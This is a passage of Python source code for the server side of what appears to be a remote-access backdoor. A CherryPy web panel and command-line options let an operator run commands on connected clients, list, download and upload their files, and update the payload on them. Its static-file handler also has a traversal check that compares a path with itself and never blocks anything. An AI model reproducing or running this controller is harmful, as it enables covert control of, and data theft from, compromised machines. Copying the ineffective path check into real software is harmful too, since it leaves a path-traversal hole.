                temp += '%15s  %s\n' % ('{:0,.2f}'.format(size).split('.')[0], \
                                        self.to_link('%s/fget?id=%s&p=%s' % \
                                        (Conf.HTTP_PATH, client_id, to_path(name)), name))

        return self.to_html(title, (data % (client_id, client.addr[0], '\\'.join(nav))) + temp)

    @cherrypy.expose
    def fget(self, cancel = False, **data): 

        title = 'Download File'

        assert data.has_key('id')
        assert data.has_key('p')

        client_id, path = data['id'], urllib.unquote_plus(data['p'])
        helper = ClientHelper(client_id)

        assert len(path) > 0

        if not helper.mapper_connect():

            return self.to_html(title, '<font color="red">ERROR: No such client</font>')

        # generate local file name
        fname = '%s_%s' % (hashlib.md5(path.encode('UTF-8')).hexdigest(), 
                           path.replace('\\', '/').split('/')[-1])

        fpath = os.path.join(Conf.DOWNLOADS_DIR_PATH, client_id, fname)

        # download file from the client
        if helper.file_get(path, fpath):

            # server downloaded file
            raise cherrypy.HTTPRedirect('%s/downloads/%s/%s' % (Conf.HTTP_PATH, client_id, 
                                                                cgi.escape(fname)))

        return self.to_html(title, '<font color="red">ERROR: Can\'t download file from the client</font>')

    @cherrypy.expose
    def fput(self, cancel = False, **data): 

        title = 'Upload File'

        assert data.has_key('file')
        assert data.has_key('id')
        assert data.has_key('p')        

        client_id, path, f = data['id'], urllib.unquote_plus(data['p']), data['file']
        helper = ClientHelper(client_id)

        assert len(path) > 0

        if len(f.filename) == 0:

            return self.to_html(title, '<font color="red">ERROR: File not selected</font>')

        if not helper.mapper_connect():

            return self.to_html(title, '<font color="red">ERROR: No such client</font>')

        full_path = path + '\\' + f.filename
        local_path = os.path.join(tempfile.gettempdir(), hashlib.md5(full_path.encode('UTF-8')).hexdigest())

        with open(local_path, 'wb') as fd:

            while True:
                
                # write file to the tmporary location
                data = f.file.read(BUFF_SIZE)
                if len(data) == 0: break

                fd.write(data)

        # upload file to the client
        ret = helper.file_put(full_path, local_path)

        # delete temporary file
        if os.path.isfile(local_path): os.unlink(local_path)

        if ret:

            raise cherrypy.HTTPRedirect('%s/flist?id=%s&p=%s' % (Conf.HTTP_PATH, client_id, \
                                                                cgi.escape(path)))

        return self.to_html(title, '<font color="red">ERROR: Can\'t upload file to the client</font>')

    @cherrypy.expose
    def shutdown(self, cancel = False, **data): 

        class ShutdownThread(Thread):

            def run(self): 

                time.sleep(1)
                shutdown()

        # run shutdown procedure in separate thread
        ShutdownThread().start()        

        return self.to_html('', 'SUCCESS')

class ServerHttpRoot(object):    

    def __init__(self, data):
    
        self.data = data

    @cherrypy.expose
    def index(self, cancel = False, **data): 

        return ''

class ServerHttpWatcher(cherrypy.process.plugins.SimplePlugin):

    def stop(self):

        shutdown()

class ServerHttp():

    def __init__(self):

        def _error_page(status, message, traceback, version): 

            return status   

        def _staticdir(section, dir, root = '', match = '', content_types = None, 
                       index = '', lister = None, **kwargs):

            from cherrypy.lib import cptools
            from cherrypy.lib.static import staticdir

            # first call old staticdir, and see if it does anything
            if staticdir(section, dir, root, match, content_types, index):

                return True

            if lister is None: 

                return False
            
            # allow the use of '~' to refer to a user's home directory
            path_full = os.path.expanduser(dir)

            # if dir is relative, make absolute using "root"
            if not os.path.isabs(path_full):

                if not root:

                    raise(Exception('Static dir requires an absolute dir (or root)'))

                path_full = os.path.join(root, path)
            
            # determine where we are in the object tree relative to 'section'
            if section == 'global': section = '/'

            section = section.rstrip(r'\/')
            branch = cherrypy.request.path_info[len(section) + 1 :]
            branch = urllib.unquote(branch.lstrip(r'\/'))

            path = section

            if len(branch) > 0:

                if branch[-1] in [ '\\', '/' ]: 

                    # remove ending slash
                    branch = branch[: -1]

                path = os.path.join(path, branch)
                path_full = os.path.join(path_full, branch)            
            
            # check that the final filename is a child of dir
            if not os.path.normpath(path_full).startswith(os.path.normpath(path_full)):

                # forbidden
                raise cherrypy.HTTPError(403)             

            # if path is relative, we should return an error
            if not os.path.isabs(path_full):

                raise(Exception('"%s" is not an absolute path' % path_full))

            if os.path.isdir(path_full):

                # set the Last-Modified response header
                cptools.validate_since()
                
                cherrypy.response.headers['Content-Type'] = 'text/html; charset=utf-8'
                cherrypy.response.body = lister(path, path_full)
                
                cherrypy.request.is_index = True
                return True

            return False

        def _staticdir_list(path, path_full):

            data = '''<div class="info">
    <b>Path</b>: %s

</div>
'''
            if path[0] in [ '\\', '/' ]:

                # remove starting slash
                path = path[1 :]

            temp, nav, items = '', [], path.replace('\\', '/').split('/')
            to_link = lambda p, t: '<a href="%s/%s">%s</a>' % (Conf.HTTP_PATH, p, t)

            for i in range(len(items)):

                # make current path for bavigation bar
                nav.append(to_link('\\'.join(items[: i + 1]), items[i]))

            if len(nav) > 1:

                temp += '%15s [%s]\n' % ('', to_link('/'.join(items[: -1]), '..'))

            for fname in os.listdir(path_full):

                fpath = os.path.join(path_full, fname)
                if os.path.isdir(fpath):

                    # list directories
                    temp += '%15s [%s]\n' % ('', to_link(path + '/' + fname, fname))

            for fname in os.listdir(path_full):

                fpath = os.path.join(path_full, fname)
                if os.path.isfile(fpath):

                    # list files
                    size = os.path.getsize(fpath)
                    temp += '%15s %s\n' % ('{:0,.2f}'.format(size).split('.')[0], 
                                           to_link(path + '/' + fname, fname))

            return ServerHttpAdmin.tmpl % ('Directory List', '', (data % '/'.join(nav)) + temp)

        # create needed directories
        if not os.path.isdir(Conf.LOG_DIR_PATH): os.mkdir(Conf.LOG_DIR_PATH)
        if not os.path.isdir(Conf.DOWNLOADS_DIR_PATH): os.mkdir(Conf.DOWNLOADS_DIR_PATH)

        # Replace the real staticdir with our version
        cherrypy.tools.staticdir = cherrypy._cptools.HandlerTool(_staticdir)

        # auth
        get_ha1 = cherrypy.lib.auth_digest.get_ha1_dict_plain(Conf.HTTP_USERS)

        # Some global configuration; note that this could be moved into a
        # configuration file
        cherrypy.config.update({

            'server.socket_port': Conf.HTTP_PORT,
            'server.socket_host': Conf.HTTP_ADDR,
            'tools.encode.on': True,
            'tools.encode.encoding': 'utf-8',
            'tools.decode.on': True,
            'tools.trailing_slash.on': True,
            'tools.sessions.on': True,
            'session_filter.on': True,
            'tools.gzip.on': True,
            'tools.gzip.mime_types': [ 'text/html', 'text/plain', 'text/javascript', 'text/css' ]
        })

        cherrypy.tree.mount(ServerHttpRoot({}), '/',
        {
            '/':
            {
                'error_page.default': _error_page,
                'response.headers.server': Conf.HTTP_SERVER_NAME
            },

            '/favicon.ico':
            {
                'tools.staticfile.on': True,
                'tools.staticfile.filename': os.path.join(Conf.HTTP_STATIC, 'favicon.ico')
            }
        })     

        # content types to serve static files
        content_types = { 'log': 'text/plain; charset=utf-8',
                          'txt': 'text/plain; charset=utf-8' }

        cherrypy.tree.mount(ServerHttpAdmin({}), Conf.HTTP_PATH + '/',
        {
            '/':
            {                
                'tools.auth_digest.on': True,
                'tools.auth_digest.realm': Conf.HTTP_RELAM,
                'tools.auth_digest.get_ha1': get_ha1,
                'tools.auth_digest.key': Conf.HTTP_DIGEST_KEY,
                'error_page.401': _error_page,
                'response.headers.server': Conf.HTTP_SERVER_NAME
            },

            '/static':
            {
                'tools.auth_digest.on': True,
                'tools.auth_digest.realm': Conf.HTTP_RELAM,
                'tools.auth_digest.get_ha1': get_ha1, 
                'tools.auth_digest.key': Conf.HTTP_DIGEST_KEY,
                'tools.staticdir.on': True,
                'tools.staticdir.dir': Conf.HTTP_STATIC,
                'tools.staticdir.lister': _staticdir_list
            },

            '/logs':
            {
                'tools.auth_digest.on': True,
                'tools.auth_digest.realm': Conf.HTTP_RELAM,
                'tools.auth_digest.get_ha1': get_ha1,
                'tools.auth_digest.key': Conf.HTTP_DIGEST_KEY,
                'tools.staticdir.on': True,
                'tools.staticdir.dir': Conf.LOG_DIR_PATH,
                'tools.staticdir.lister': _staticdir_list,
                'tools.staticdir.content_types': content_types
            },            

            '/downloads':
            {
                'tools.auth_digest.on': True,
                'tools.auth_digest.realm': Conf.HTTP_RELAM,
                'tools.auth_digest.get_ha1': get_ha1,
                'tools.auth_digest.key': Conf.HTTP_DIGEST_KEY,
                'tools.staticdir.on': True,
                'tools.staticdir.dir': Conf.DOWNLOADS_DIR_PATH,
                'tools.staticdir.lister': _staticdir_list,
                'tools.staticdir.content_types': content_types
            },

            '/server.log':
            {
                'tools.auth_digest.on': True,
                'tools.auth_digest.realm': Conf.HTTP_RELAM,
                'tools.auth_digest.get_ha1': get_ha1,
                'tools.auth_digest.key': Conf.HTTP_DIGEST_KEY,
                'tools.staticfile.on': True,
                'tools.staticfile.filename': Conf.LOG_PATH_SERVER,
                'tools.staticfile.content_types': content_types
            },

            '/access.log':
            {
                'tools.auth_digest.on': True,
                'tools.auth_digest.realm': Conf.HTTP_RELAM,
                'tools.auth_digest.get_ha1': get_ha1,
                'tools.auth_digest.key': Conf.HTTP_DIGEST_KEY,
                'tools.staticfile.on': True,
                'tools.staticfile.filename': Conf.LOG_PATH_ACCESS,
                'tools.staticfile.content_types': content_types
            }
        })        

        if os.path.isfile(Conf.LOG_PATH_ACCESS):

            # delete old log file
            try: os.unlink(Conf.LOG_PATH_ACCESS)
            except: pass

        cherrypy.config.update(
        {
            'log.access_file': Conf.LOG_PATH_ACCESS,
            'log.error_file': Conf.LOG_PATH_ACCESS
        })

        self.watcher = ServerHttpWatcher(cherrypy.engine)
        self.watcher.subscribe()

    def serve_forever(self):

        cherrypy.engine.start()
        cherrypy.engine.block()

def main():

    option_list = [

        make_option("-k", "--keys", dest = "keys", default = False, action = "store_true",
            help = "generate new private/public key pair"),

        make_option("-s", "--shutdown", dest = "shutdown", default = False, action = "store_true",
            help = "shutdown running server"),

        make_option("-d", "--daemon", dest = "daemon", default = False, action = "store_true",
            help = "run in the background"),

        make_option("-a", "--address", dest = "addr", default = None,
            help = "server address to listen on"),

        make_option("-p", "--port", dest = "port", default = None,
            help = "server port to listen on"),

        make_option("--log-path", dest = "log_path", default = None,
            help = "log file path"),

        make_option("-l", "--list", dest = "list", default = False, action = "store_true",
            help = "list connected clients"),

        make_option("-c", "--client", dest = "client", default = None,
            help = "client ID to operate"),

        make_option("-e", "--exec", dest = "_exec", default = None,
            help = "execute command on given client"),

        make_option("-u", "--update", dest = "update", default = None,
            help = "update payload on given client"),

        make_option("--flist", dest = "flist", default = None,
            help = "list files on given client"),

        make_option("--fget", dest = "fget", default = None,
            help = "download file from given client to the location specified in --file"), 

        make_option("--fput", dest = "fput", default = None,
            help = "upload file specified in --file to given client"), 

        make_option("--file", dest = "file", default = None,
            help = "file path for --fget and --fput") ]

    parser = OptionParser(option_list = option_list)
    options, _ = parser.parse_args()

    options.addr = Conf.CLIENT_HOST if options.addr is None else options.addr
    options.port = Conf.CLIENT_PORT if options.port is None else int(options.port)

    if options.list:

        clients = ClientHelper().client_list()
        if len(clients) == 0:

            print('No clients connected')
            return -1

        print('\n  Connected clients')
        print('----------------------\n')

        for client in clients:

            print(' * ID = %s, addr = %s, PID = %d' % (client.client_id, client.addr[0], client.map_pid))

        print('')

        return 0

    elif options._exec is not None:

        if options.client is None:

            print('ERROR: Client ID is not specified')
            return -1

        helper = ClientHelper(options.client)        

        if not helper.mapper_connect(): 

            print('ERROR: No such client')
            return -1

        print('[+] \"%s\" command output:\n' % options._exec)

        _, code = helper.execute(options._exec, stream = sys.stdout)

        print('\n[+] Command exit code is 0x%.8x' % code)

        return 0

    elif options.flist is not None:

        if options.client is None:

            print('ERROR: Client ID is not specified')
            return -1

        helper = ClientHelper(options.client)        

        if not helper.mapper_connect(): 

            print('ERROR: No such client')
            return -1

        files = helper.file_list(options.flist)
        if files is None: return -1

        print('List of the files in \"%s\":\n' % options.flist)

        for size, name in files:

            if size is None:

                print('%15s [%s]' % ('', name))

        for size, name in files:

            if size is not None:

                print('%15s %s' % ('%d' % size, name))

        print('')
        return 0

    elif options.fget is not None:

        if options.client is None:

            print('ERROR: Client ID is not specified')
            return -1

        if options.file is None:

            print('ERROR: File path is not specified')
            return -1

        helper = ClientHelper(options.client)        

        if not helper.mapper_connect(): 

            print('ERROR: No such client')
            return -1

        return 0 if helper.file_get(options.fget, options.file) else -1

    elif options.fput is not None:

        if options.client is None:

            print('ERROR: Client ID is not specified')
            return -1

        if options.file is None:

            print('ERROR: File path is not specified')
            return -1

        if not os.path.isfile(options.file):

            print('ERROR: File "%s" doesn\'t exists' % options.file)
            return -1

        helper = ClientHelper(options.client)        

        if not helper.mapper_connect(): 

            print('ERROR: No such client')
            return -1

        return 0 if helper.file_put(options.fput, options.file) else -1

    elif options.update is not None:        

        if options.client is None:

            print('ERROR: Client ID is not specified')
            return -1

        if not os.path.isfile(options.update):

            print('ERROR: File "%s" doesn\'t exists' % options.update)
            return -1

        helper = ClientHelper(options.client)

        if not helper.mapper_connect(): 

            print('ERROR: No such client')
            return -1

        if helper.update(options.update):

            print('SUCCESS')
            return 0

        else: 

            print('FAILS')
            return -1

    elif options.keys:

        KeysManager(Conf.CERT_DIR_PATH).generate(Conf.CERT_NAME, overwrite = False)
        return 0

    elif options.shutdown:        

        shutdown()
        return 0

    # start log file
    log_open(Conf.LOG_PATH_SERVER if options.log_path is None else options.log_path)            

    server = Server(options.addr, options.port)

    # flush database
    ClientHelper().client_del_all()

    # deamonize server
    if options.daemon: Daemon()    

    child_pid = os.fork()
    if child_pid == 0:   

        try:

            ServerHttp().serve_forever()

        except Exception, why:

            log_write(u'HTTP server error: %s\n' % str(why))
        
        exit(0)

    pid = os.getpid()
    pgid = os.getpgid(pid)

    log_write(u'%s PID = %d, PGID = %d\n' % (os.path.basename(sys.argv[0]), pid, pgid))

    with open(Conf.PGID_FILE_PATH, 'w') as fd: 

        # write current PGID into the file
        fd.write(str(pgid))   

    def handle_sigchld(a1, a2):
  
        os.waitpid(-1, os.WNOHANG)

    signal.signal(signal.SIGCHLD, handle_sigchld)  

    try:

        server.serve_forever() 

    except KeyboardInterrupt:

        pass 

    return 0

if __name__ == '__main__':

    exit(main())

#
# EoF
#

